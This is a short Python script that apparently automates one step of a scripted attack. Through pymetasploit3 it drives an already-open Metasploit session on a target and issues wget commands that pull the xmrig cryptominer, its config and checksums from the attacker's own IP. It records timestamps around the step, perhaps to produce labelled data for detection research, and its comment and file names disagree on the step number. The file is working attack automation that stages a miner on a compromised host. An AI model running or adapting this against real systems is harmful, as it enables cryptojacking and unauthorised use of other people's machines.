import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')


    # start step 7
    output_time_file_start = 'time_step_6_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(60)

    try:
        shell = client.sessions.session('3')
        shell.write('wget --no-check-certificate http://{0}/downloads/xmrig'.format(my_ip))
        shell.write('wget --no-check-certificate http://{0}/downloads/config.json'.format(my_ip))
        shell.write('wget --no-check-certificate http://{0}/downloads/SHA256SUMS'.format(my_ip))
    
    except Exception as e:
        print(e)
        pass
    
    time.sleep(30)
    output_time_file_end = 'time_step_6_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(60)


main(sys.argv)
